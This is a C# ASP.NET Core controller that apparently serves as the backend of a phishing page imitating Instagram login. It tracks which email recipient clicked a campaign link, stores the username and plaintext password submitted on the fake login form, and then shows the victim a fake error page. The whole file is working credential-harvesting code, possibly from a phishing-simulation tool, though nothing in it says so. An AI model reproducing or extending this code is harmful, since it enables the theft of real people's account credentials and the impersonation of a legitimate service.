using Entitites.Models;
using Microsoft.AspNetCore.Mvc;
using Services.Contracts;

namespace GtApp.Controllers
{
    public class InstagramController : Controller
    {
        private readonly IServiceManager _manager;


        public InstagramController(IServiceManager manager)
        {
            _manager = manager;
        } 

        public IActionResult Error()
        {            

            return View();
        }

        public IActionResult Login(string uniqueIdentifier, int campaignId)
        {

            HttpContext.Session.SetString("UniqueIdentifier", uniqueIdentifier);
            HttpContext.Session.SetInt32("CampaignId", campaignId);

            LogEvent(uniqueIdentifier, campaignId, "clicked");            
            
            return View();
        }

        [HttpPost]
        public IActionResult Login(SocialMediaLogin smLogin)
        {
            var uniqueIdentifier = HttpContext.Session.GetString("UniqueIdentifier");
            var campaignId = HttpContext.Session.GetInt32("CampaignId");


            if(ModelState.IsValid)
            {
                var newsmLogin = new SocialMediaLogin
                {
                    UserTerm = smLogin.UserTerm,
                    Password = smLogin.Password,
                    LoginDate = smLogin.LoginDate,
                    CampaignId = campaignId,
                };

                LogEvent(uniqueIdentifier, campaignId.Value, "submitted");

                _manager.SocialMediaLoginService.CreateSocialMediaLogin(newsmLogin);

                return RedirectToAction("Error");
            }

            return View();
        }

        private void LogEvent(string uniqueIdentifier, int campaignId, string interactionType)
        {
            var emailClickLog = new EmailLog
            {
                UniqueIdentifier = uniqueIdentifier,
                CampaignId = campaignId,
                InteractionType = interactionType,
                ClickTimestamp = DateTime.UtcNow // Use UTC time to avoid timezone issues
            };

            _manager.EmailLogService.CreateEmailLog(emailClickLog);
        }

    }
}
